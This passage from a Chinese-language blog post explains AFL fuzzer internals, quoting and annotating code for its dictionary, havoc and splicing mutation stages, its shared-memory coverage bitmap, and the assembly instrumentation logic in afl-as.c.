title="interest 16/8"></a>interest 16/8</h3><p>和<code>interest 8/8</code> 相同，只不过这里每次替换两字节。</p><h3 id="interest-32-8"><a href="#interest-32-8" class="headerlink" title="interest 32/8"></a>interest 32/8</h3><p>同理，这里每次替换四字节</p><h2 id="DICTIONARY-STUFF"><a href="#DICTIONARY-STUFF" class="headerlink" title="DICTIONARY STUFF"></a>DICTIONARY STUFF</h2><p>在这一个阶段将会采用字典中的数据来替换测试用例中的某些数据。这里一共分为三种模式，如下</p><h3 id="user-extras-over"><a href="#user-extras-over" class="headerlink" title="user extras (over)"></a>user extras (over)</h3><ul><li><p><code>user extras (over)</code> 代码部分如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!extras_cnt) <span class="keyword">goto</span> skip_user_extras;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Overwrite with user-supplied extras. */</span></span><br><span class="line"></span><br><span class="line">  stage_name  = <span class="string">&quot;user extras (over)&quot;</span>;</span><br><span class="line">  stage_short = <span class="string">&quot;ext_UO&quot;</span>;</span><br><span class="line">  stage_cur   = <span class="number">0</span>;</span><br><span class="line">  stage_max   = extras_cnt * len;</span><br><span class="line"></span><br><span class="line">  stage_val_type = STAGE_VAL_NONE;</span><br><span class="line"></span><br><span class="line">  orig_hit_cnt = new_hit_cnt;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line"></span><br><span class="line">    u32 last_len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    stage_cur_byte = i;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Extras are sorted by size, from smallest to largest. This means</span></span><br><span class="line"><span class="comment">       that we don&#x27;t have to worry about restoring the buffer in</span></span><br><span class="line"><span class="comment">       between writes at a particular offset determined by the outer</span></span><br><span class="line"><span class="comment">       loop. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; extras_cnt; j++) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Skip extras probabilistically if extras_cnt &gt; MAX_DET_EXTRAS. Also</span></span><br><span class="line"><span class="comment">         skip them if there&#x27;s no room to insert the payload, if the token</span></span><br><span class="line"><span class="comment">         is redundant, or if its entire span has no bytes set in the effector</span></span><br><span class="line"><span class="comment">         map. */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((extras_cnt &gt; MAX_DET_EXTRAS &amp;&amp; <span class="built_in">UR</span>(extras_cnt) &gt;= MAX_DET_EXTRAS) ||</span><br><span class="line">          extras[j].len &gt; len - i ||</span><br><span class="line">          !<span class="built_in">memcmp</span>(extras[j].data, out_buf + i, extras[j].len) ||</span><br><span class="line">          !<span class="built_in">memchr</span>(eff_map + <span class="built_in">EFF_APOS</span>(i), <span class="number">1</span>, <span class="built_in">EFF_SPAN_ALEN</span>(i, extras[j].len))) &#123;</span><br><span class="line"></span><br><span class="line">        stage_max--;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      last_len = extras[j].len;</span><br><span class="line">      <span class="built_in">memcpy</span>(out_buf + i, extras[j].data, last_len);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">common_fuzz_stuff</span>(argv, out_buf, len)) <span class="keyword">goto</span> abandon_entry;</span><br><span class="line"></span><br><span class="line">      stage_cur++;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Restore all the clobbered memory. */</span></span><br><span class="line">    <span class="built_in">memcpy</span>(out_buf + i, in_buf + i, last_len);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  new_hit_cnt = queued_paths + unique_crashes;</span><br><span class="line"></span><br><span class="line">  stage_finds[STAGE_EXTRAS_UO]  += new_hit_cnt - orig_hit_cnt;</span><br><span class="line">  stage_cycles[STAGE_EXTRAS_UO] += stage_max;</span><br></pre></td></tr></table></figure></li></ul><p>这里我们看到该部分的操作就是，步长为1字节，然后依次将字典中的字符串替换到out_buf+index的位置。这里收到eff_map的影响。</p><p>并且这里会检查字典中的Token的数量，如果其大于<code>MAX_DET_EXTRAS=200</code> ，那么对Token就会存在一个概率，计算如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">UR</span>(extras_cnt) &gt;= MAX_DET_EXTRAS <span class="comment">// 这里UR就是产生一个0-extras_cnt的随机值。</span></span><br></pre></td></tr></table></figure><p>也就是这个概率随着字典中Token数量的增大而减小。</p><h3 id="user-extras-insert"><a href="#user-extras-insert" class="headerlink" title="user extras (insert)"></a>user extras (insert)</h3><p>那么这里就是插入操作，也就是步长为1字节，将字典中的字符串插入到相应的位置，这里很明显不会收到eff_map的影响。并且这里不受字典长度的限制</p><h3 id="auto-extras-over"><a href="#auto-extras-over" class="headerlink" title="auto extras (over)"></a>auto extras (over)</h3><p>注意到这里的字典从<code>extras</code> 替换为了<code>a_extras</code> ，也就是这一步的字典使用的实际上是我们前面在进行bitflip的时候所自动生成的字典信息。这里将以1字节为步长，将相应位置替换为字典中的字符串。</p><h2 id="RANDOM-HAVOC"><a href="#RANDOM-HAVOC" class="headerlink" title="RANDOM HAVOC"></a>RANDOM HAVOC</h2><p>这一部分就是随机变异的内容，在这一步中将会在下面的几种变异方式中随机选择一种</p><ul><li>随机选取测试用例中的1bit进行翻转</li><li>随机选取测试用例中的1字节替换为<code>interesting_8</code> 中随机选取的一个值</li><li>随机选取测试用例中的2字节，随机选取大小端，替换为<code>interesting_16</code> 中随机选取的一个值</li><li>随机选取测试用例中的4字节，随机选取大小端，替换为<code>interesting_32</code> 中随机选取的一个值</li><li>随机选取测试用例中的1字节，对其减去1-35中的一个随机数</li><li>随机选取测试用例中的1字节，对其加上1-35中的一个随机数</li><li>随机选取测试用例中的2字节，随机选取大小端，对其减去1-35中的一个随机数</li><li>随机选取测试用例中的2字节，随机选取大小端，对其加上1-35中的一个随机数</li><li>随机选取测试用例中的4字节，随机选取大小端，对其减去1-35中的一个随机数</li><li>随机选取测试用例中的4字节，随机选取大小端，对其加上1-35中的一个随机数</li><li>随机选取测试用例中的1字节，将其异或1-255之间的一个随机值</li><li>随机选取测试用例中的一段字节，将其删除</li><li>随机选取测试用例中的一个位置，以75%的概率插入测试用例中的一段随机位置、随机长度的字符串，以25%的概率插入一段随机数</li><li>随机选取测试用例中的一个位置，以75%的概率替换为测试用例中的一段随机位置、随机长度的字符串，以25%的概率替换为一段随机数</li><li>如果字典不为空（系统字典+用户字典），那么随机选取一个字典，随机选取字典中的一个字符串，将其替换到测试用例中的随机位置</li><li>如果字典不为空（系统字典+用户字典），那么随机选取一个字典，随机选取字典中的一个字符串，将其插入到测试用例中的随机位置</li></ul><h2 id="SPLICING"><a href="#SPLICING" class="headerlink" title="SPLICING"></a>SPLICING</h2><ul><li><p>Splicing部分代码如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* This is a last-resort strategy triggered by a full round with no findings.</span></span><br><span class="line"><span class="comment">     It takes the current input file, randomly selects another input, and</span></span><br><span class="line"><span class="comment">     splices them together at some offset, then relies on the havoc</span></span><br><span class="line"><span class="comment">     code to mutate that blob. */</span></span><br><span class="line"></span><br><span class="line">retry_splicing:</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (use_splicing &amp;&amp; splice_cycle++ &lt; SPLICE_CYCLES &amp;&amp;</span><br><span class="line">      queued_paths &gt; <span class="number">1</span> &amp;&amp; queue_cur-&gt;len &gt; <span class="number">1</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">queue_entry</span>* target;</span><br><span class="line">    u32 tid, split_at;</span><br><span class="line">    u8* new_buf;</span><br><span class="line">    s32 f_diff, l_diff;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* First of all, if we&#x27;ve modified in_buf for havoc, let&#x27;s clean that</span></span><br><span class="line"><span class="comment">       up... */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (in_buf != orig_in) &#123;</span><br><span class="line">      <span class="built_in">ck_free</span>(in_buf);</span><br><span class="line">      in_buf = orig_in;</span><br><span class="line">      len = queue_cur-&gt;len;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Pick a random queue entry and seek to it. Don&#x27;t splice with yourself. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">do</span> &#123; tid = <span class="built_in">UR</span>(queued_paths); &#125; <span class="keyword">while</span> (tid == current_entry);</span><br><span class="line"></span><br><span class="line">    splicing_with = tid;</span><br><span class="line">    target = queue;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (tid &gt;= <span class="number">100</span>) &#123; target = target-&gt;next_100; tid -= <span class="number">100</span>; &#125;</span><br><span class="line">    <span class="keyword">while</span> (tid--) target = target-&gt;next;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Make sure that the target has a reasonable length. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (target &amp;&amp; (target-&gt;len &lt; <span class="number">2</span> || target == queue_cur)) &#123;</span><br><span class="line">      target = target-&gt;next;</span><br><span class="line">      splicing_with++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!target) <span class="keyword">goto</span> retry_splicing;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Read the testcase into a new buffer. */</span></span><br><span class="line"></span><br><span class="line">    fd = <span class="built_in">open</span>(target-&gt;fname, O_RDONLY);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) <span class="built_in">PFATAL</span>(<span class="string">&quot;Unable to open &#x27;%s&#x27;&quot;</span>, target-&gt;fname);</span><br><span class="line"></span><br><span class="line">    new_buf = <span class="built_in">ck_alloc_nozero</span>(target-&gt;len);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">ck_read</span>(fd, new_buf, target-&gt;len, target-&gt;fname);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">close</span>(fd);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Find a suitable splicing location, somewhere between the first and</span></span><br><span class="line"><span class="comment">       the last differing byte. Bail out if the difference is just a single</span></span><br><span class="line"><span class="comment">       byte or so. */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">locate_diffs</span>(in_buf, new_buf, <span class="built_in">MIN</span>(len, target-&gt;len), &amp;f_diff, &amp;l_diff);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (f_diff &lt; <span class="number">0</span> || l_diff &lt; <span class="number">2</span> || f_diff == l_diff) &#123;</span><br><span class="line">      <span class="built_in">ck_free</span>(new_buf);</span><br><span class="line">      <span class="keyword">goto</span> retry_splicing;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Split somewhere between the first and last differing byte. */</span></span><br><span class="line"></span><br><span class="line">    split_at = f_diff + <span class="built_in">UR</span>(l_diff - f_diff);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Do the thing. */</span></span><br><span class="line"></span><br><span class="line">    len = target-&gt;len;</span><br><span class="line">    <span class="built_in">memcpy</span>(new_buf, in_buf, split_at);</span><br><span class="line">    in_buf = new_buf;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">ck_free</span>(out_buf);</span><br><span class="line">    out_buf = <span class="built_in">ck_alloc_nozero</span>(len);</span><br><span class="line">    <span class="built_in">memcpy</span>(out_buf, in_buf, len);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">goto</span> havoc_stage;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></li></ul><p>这一部分做的事测试用例之间的切割和重组。</p><p>具体来说，这里首先是随机选取了另一个测试用例，然后调用<code>locate_diffs</code> 函数，在这两个测试用例的第一个不同的字节到最后一个不同的字节之间随机选取一个位置，将这两个测试用例分别分为两个部分，将当前测试用例的第一部分和随机选取的测试用例的第二部分进行一个重组。</p><p>这里的<code>locate_diffs</code> 实际上就是循环遍历长度最小的测试用例，然后字符之间进行比较。</p><h1 id="路径信息的获取和分析"><a href="#路径信息的获取和分析" class="headerlink" title="路径信息的获取和分析"></a>路径信息的获取和分析</h1><p>这里前面实际上一直存在一个问题，就是问什么我们调用完run_target之后，就能够获取得到运行过程中的路径信息呢。这里我们先来看一下初始化时候的函数也就是<code>setup_shm</code> 函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Configure shared memory and virgin_bits. This is called at startup. */</span></span><br><span class="line"></span><br><span class="line"><span class="function">EXP_ST <span class="type">void</span> <span class="title">setup_shm</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  u8* shm_str;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!in_bitmap) <span class="built_in">memset</span>(virgin_bits, <span class="number">255</span>, MAP_SIZE);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(virgin_tmout, <span class="number">255</span>, MAP_SIZE);</span><br><span class="line">  <span class="built_in">memset</span>(virgin_crash, <span class="number">255</span>, MAP_SIZE);</span><br><span class="line"></span><br><span class="line">  shm_id = <span class="built_in">shmget</span>(IPC_PRIVATE, MAP_SIZE, IPC_CREAT | IPC_EXCL | <span class="number">0600</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (shm_id &lt; <span class="number">0</span>) <span class="built_in">PFATAL</span>(<span class="string">&quot;shmget() failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">atexit</span>(remove_shm);</span><br><span class="line"></span><br><span class="line">  shm_str = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%d&quot;</span>, shm_id);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* If somebody is asking us to fuzz instrumented binaries in dumb mode,</span></span><br><span class="line"><span class="comment">     we don&#x27;t want them to detect instrumentation, since we won&#x27;t be sending</span></span><br><span class="line"><span class="comment">     fork server commands. This should be replaced with better auto-detection</span></span><br><span class="line"><span class="comment">     later on, perhaps? */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!dumb_mode) <span class="built_in">setenv</span>(SHM_ENV_VAR, shm_str, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">ck_free</span>(shm_str);</span><br><span class="line"></span><br><span class="line">  trace_bits = <span class="built_in">shmat</span>(shm_id, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (!trace_bits) <span class="built_in">PFATAL</span>(<span class="string">&quot;shmat() failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>shmget</code> 函数会初始化一段<code>MAP_SIZE</code> 大小的共享内存。这里<code>IPC_PRIVATE</code> 的值是0，那么这里就会创建新的共享对象，这里返回的结果是共享内存的标识符。<code>IPC_CREAT|IPC_EXCL</code> 标识符表示的则是如果内核中不存在键值与key相等的共享内存，那么这里将会建立一个新的消息队列，如果存在这样的共享内存那么就会报错。</p><p>注意到这里如果不是<code>dumb_mode</code> 的话，那么就会将获取得到的共享内存的标识写入到环境变量中即<code>SHM_ENV_VAR</code> 。</p><p>之后将调用<code>shmat</code>函数将创建的共享内存对象映射到调用进程的地址空间中，也就是<code>trace_bits</code> 指向的内存空间，这里看到是我们保存路径信息的地方。</p><p>这里在每次调用<code>run_target</code>开始Fuzz的时候会首先调用如下的代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(trace_bits, <span class="number">0</span>, MAP_SIZE);</span><br></pre></td></tr></table></figure><p>即将<code>trace_bits</code> 信息全部清空。那么之后无论是该进程调用fork还是和forkserver进行通信的话，就没有再操作<code>trace_bits</code> 这一块内存空间了。</p><p>要想知道接下来的操作，我们这里还需要再看一下<code>afl-as.c</code> 文件的内容</p><h1 id="插桩部分源码分析"><a href="#插桩部分源码分析" class="headerlink" title="插桩部分源码分析"></a>插桩部分源码分析</h1><p>这一部分的主要代码是afl-as.c</p><h2 id="什么时候进行插桩"><a href="#什么时候进行插桩" class="headerlink" title="什么时候进行插桩"></a>什么时候进行插桩</h2><h3 id="插桩位置1-基本块的开始"><a href="#插桩位置1-基本块的开始" class="headerlink" title="插桩位置1-基本块的开始"></a>插桩位置1-基本块的开始</h3><p>从前面的源码文件结构中我们实际上可以知道，该部分的代码实现的主要就是插桩功能。Main函数的逻辑比较简单，这里主要功能的实现就是<code>add_instrumentation</code> 函数，这里我们看一下函数的功能，这里首先从<code>input_file</code> 中读取数据，将修改后的文件的内容写入到<code>modified_file</code> 中。</p><p>这里会依次的读取文件中的每一行的内容。在符合条件的情况下，会按照64位或者32位的方式插入一段代码，如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!pass_thru &amp;&amp; !skip_intel &amp;&amp; !skip_app &amp;&amp; !skip_csect &amp;&amp; instr_ok &amp;&amp;</span><br><span class="line">    instrument_next &amp;&amp; line[<span class="number">0</span>] == <span class="string">&#x27;\t&#x27;</span> &amp;&amp; <span class="built_in">isalpha</span>(line[<span class="number">1</span>])) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32,</span><br><span class="line">          <span class="built_in">R</span>(MAP_SIZE));</span><br><span class="line"></span><br><span class="line">  instrument_next = <span class="number">0</span>;</span><br><span class="line">  ins_lines++;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">fputs</span>(line, outf);</span><br></pre></td></tr></table></figure><p>那么这里是在哪写地方进行插入呢，这里实际上只有在.text段才会执行插入的操作，如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;text\n&quot;</span>, <span class="number">5</span>) ||</span><br><span class="line">    !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section\t.text&quot;</span>, <span class="number">13</span>) ||</span><br><span class="line">    !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section\t__TEXT,__text&quot;</span>, <span class="number">21</span>) ||</span><br><span class="line">    !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section __TEXT,__text&quot;</span>, <span class="number">21</span>)) &#123;</span><br><span class="line">  instr_ok = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">continue</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们这里看一下其他的成员变量的赋值过程，以了解在什么时候执行插入的操作，首先这里<code>pass_thru</code> 成员变量</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">strncmp</span>(input_file, tmp_dir, <span class="built_in">strlen</span>(tmp_dir)) &amp;&amp;</span><br><span class="line">    <span class="built_in">strncmp</span>(input_file, <span class="string">&quot;/var/tmp/&quot;</span>, <span class="number">9</span>) &amp;&amp;</span><br><span class="line">    <span class="built_in">strncmp</span>(input_file, <span class="string">&quot;/tmp/&quot;</span>, <span class="number">5</span>)) pass_thru = <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>这里实际上是在之前的<code>edit_params</code> 函数中触发调用的，这里我们可以看到只是判断了一下输入文件的路径。一般情况下这里<code>pass_thru</code> 的值应该是0。接下来我们看一下<code>skip_intel</code> 成员变量</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;.intel_syntax&quot;</span>)) skip_intel = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;.att_syntax&quot;</span>)) skip_intel = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>这里表示的是接下来的汇编的格式，这里att_syntax表示的是AT&amp;T格式的汇编代码，而intel_syntax则表示的是Intel格式的汇编代码，这里我们看到实际上只有针对AT&amp;T格式的汇编代码才会执行插入的操作。接下来我们看一下<code>skip_app</code> 成员变量</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&#x27;#&#x27;</span> || line[<span class="number">1</span>] == <span class="string">&#x27;#&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;#APP&quot;</span>)) skip_app = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;#NO_APP&quot;</span>)) skip_app = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里在汇编文件中，<code>#APP</code> 和<code>#NO_APP</code> 这两个标签中间包裹的内容实际上是我们在代码中插入的內联汇编的代码，也就是这里不会对內联汇编进行插入操作。我们这里再来看一下<code>skip_csect</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;.code&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;.code32&quot;</span>)) skip_csect = use_64bit;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;.code64&quot;</span>)) skip_csect = !use_64bit;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里如果是64位的话，那么对汇编中的32位的汇编代码不进行插入，同理对于32位程序，汇编中的64位汇编代码不会进行插入。<code>instrument_next</code> 这个变量则是一个关键的变量，实际上这里由于我们处理的是汇编文件，在产生汇编的时候，这里基本块已经都分配好了，<code>instrument_next</code> 则表示的是下一次是否插入，其赋值则是通过查找当前是否是一个块的开始来判断的，这里代码如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;:&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* __APPLE__ */</span></span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* .L0: or LBB0_0: style jump destination */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __APPLE__</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Apple: .L&lt;num&gt; / .LBB&lt;num&gt; */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((<span class="built_in">isdigit</span>(line[<span class="number">2</span>]) || (clang_mode &amp;&amp; !<span class="built_in">strncmp</span>(line + <span class="number">1</span>, <span class="string">&quot;LBB&quot;</span>, <span class="number">3</span>)))</span><br><span class="line">          &amp;&amp; <span class="built_in">R</span>(<span class="number">100</span>) &lt; inst_ratio) &#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* __APPLE__ */</span></span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* An optimization is possible here by adding the code only if the</span></span><br><span class="line"><span class="comment">           label is mentioned in the code in contexts 